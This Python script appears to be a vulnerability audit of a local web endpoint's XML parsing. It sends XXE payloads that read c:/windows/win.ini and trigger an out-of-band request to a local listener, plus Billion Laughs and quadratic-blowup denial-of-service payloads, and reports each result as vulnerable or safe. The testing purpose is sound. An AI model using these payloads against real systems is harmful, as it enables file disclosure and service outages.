import requests
import urllib.parse
import time
import threading
import http.server
import socketserver
import sys

# Configuration
TARGET_URL = "http://127.0.0.1:8000/admin/"
OOB_PORT = 9999
OOB_HIT_RECEIVED = False

# ANSI Colors for console output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# OOB Listener
class OOBHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global OOB_HIT_RECEIVED
        if "xxe_hit" in self.path:
            OOB_HIT_RECEIVED = True
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"XXE OOB Hit Received")
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, format, *args):
        pass

def start_oob_server():
    try:
        with socketserver.TCPServer(("", OOB_PORT), OOBHandler) as httpd:
            # print(f"[+] OOB Listener started on port {OOB_PORT}")
            start_time = time.time()
            while time.time() - start_time < 5 and not OOB_HIT_RECEIVED:
                httpd.handle_request()
    except OSError:
        pass # Port likely in use

def format_http_request(url, headers, body):
    req_str = f"POST /admin/ HTTP/1.1\n"
    req_str += f"Host: 127.0.0.1:8000\n"
    for k, v in headers.items():
        req_str += f"{k}: {v}\n"
    req_str += "\n"
    req_str += body
    return req_str

def format_http_response(response):
    res_str = f"HTTP/1.1 {response.status_code} {response.reason}\n"
    for k, v in response.headers.items():
        res_str += f"{k}: {v}\n"
    res_str += "\n"
    res_str += response.text
    return res_str

def run_test(name, payload, description, check_oob=False):
    print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}TEST: {name}{Colors.ENDC}")
    print(f"Description: {description}")
    print(f"{Colors.HEADER}{'-'*80}{Colors.ENDC}")

    # Prepare Request
    encoded_payload = urllib.parse.quote(payload)
    data = f"logoutRequest={encoded_payload}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(data)),
        "Connection": "close"
    }

    # Show Raw Request
    print(f"{Colors.OKBLUE}[REQUEST SENT]{Colors.ENDC}")
    print(format_http_request(TARGET_URL, headers, data))

    # Setup OOB
    global OOB_HIT_RECEIVED
    OOB_HIT_RECEIVED = False
    if check_oob:
        t = threading.Thread(target=start_oob_server)
        t.start()
        time.sleep(0.5)

    # Execute
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, headers=headers, timeout=5)
        duration = time.time() - start_time
    except requests.exceptions.Timeout:
        duration = time.time() - start_time
        print(f"\n{Colors.FAIL}[RESPONSE]{Colors.ENDC}")
        print(f"TIMEOUT ({duration:.2f}s)")
        print("Analysis: Request timed out. Potential DoS success.")
        return
    except Exception as e:
        print(f"\n{Colors.FAIL}[RESPONSE ERROR]{Colors.ENDC}")
        print(f"Error: {e}")
        return

    if check_oob:
        t.join()

    # Show Raw Response
    print(f"\n{Colors.OKGREEN}[RESPONSE RECEIVED] (Time: {duration:.2f}s){Colors.ENDC}")
    print(format_http_response(response))

    # Analysis
    print(f"\n{Colors.WARNING}[ANALYSIS]{Colors.ENDC}")
    
    if response.status_code == 200:
        if "Error:" in response.text:
             print("Server handled the error gracefully within the application logic.")
        else:
             print("Server processed the XML successfully.")
    elif response.status_code == 500:
        print("Server returned 500 Internal Server Error.")
        if "undefined entity" in response.text:
            print("-> VULNERABILITY STATUS: SAFE (Entity Undefined).")
            print("   The parser blocked the external entity.")
        elif "limit on input amplification" in response.text:
            print("-> VULNERABILITY STATUS: SAFE (Amplification Limit).")
            print("   The parser blocked the DoS attack.")
        else:
             print("-> VULNERABILITY STATUS: UNKNOWN (Check error message).")

    if check_oob:
        if OOB_HIT_RECEIVED:
             print(f"{Colors.FAIL}-> VULNERABILITY STATUS: VULNERABLE (OOB Hit Received!){Colors.ENDC}")
        else:
             print(f"{Colors.OKGREEN}-> VULNERABILITY STATUS: SAFE (No OOB Hit).{Colors.ENDC}")

def main():
    print(f"{Colors.BOLD}STARTING COMPREHENSIVE XML AUDIT FOR xml.etree.ElementTree{Colors.ENDC}")
    
    # 1. Baseline
    run_test("Baseline", "<root>ok</root>", "Normal XML to verify server is reachable.")

    # 2. Basic XXE (File Read)
    xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>"""
    run_test("XXE (File Read)", xxe_payload, "Attempt to read c:/windows/win.ini via external entity.")

    # 3. Blind XXE (OOB)
    oob_payload = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:{OOB_PORT}/xxe_hit">%remote;]><root>oob</root>"""
    run_test("XXE (Blind/OOB)", oob_payload, "Attempt to trigger an outbound HTTP request.", check_oob=True)

    # 4. Billion Laughs (DoS)
    # 10^9 expansion
    dos_payload = """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><root>&lol9;</root>"""
    run_test("DoS (Billion Laughs)", dos_payload, "Exponential entity expansion (10^9).")

    # 5. Quadratic Blowup (DoS)
    # Large entity (50 chars) repeated 5000 times = 250KB. Not huge, but testing behavior.
    # To really crash, we'd need MBs, but we want to see if it processes or errors.
    # A single huge entity.
    huge_entity = "A" * 50000
    quad_payload = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY large "{huge_entity}">]><root>&large;&large;&large;&large;&large;&large;&large;&large;&large;&large;</root>"""
    run_test("DoS (Quadratic Blowup)", quad_payload, "Large entity repeated multiple times (Memory exhaustion).")

    # 6. Parameter Entities
    param_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 "<!ENTITY internal 'internal'>"> %param1;]><root>&internal;</root>"""
    run_test("Parameter Entities", param_payload, "Testing DTD parameter entity parsing.")

if __name__ == "__main__":
    main()
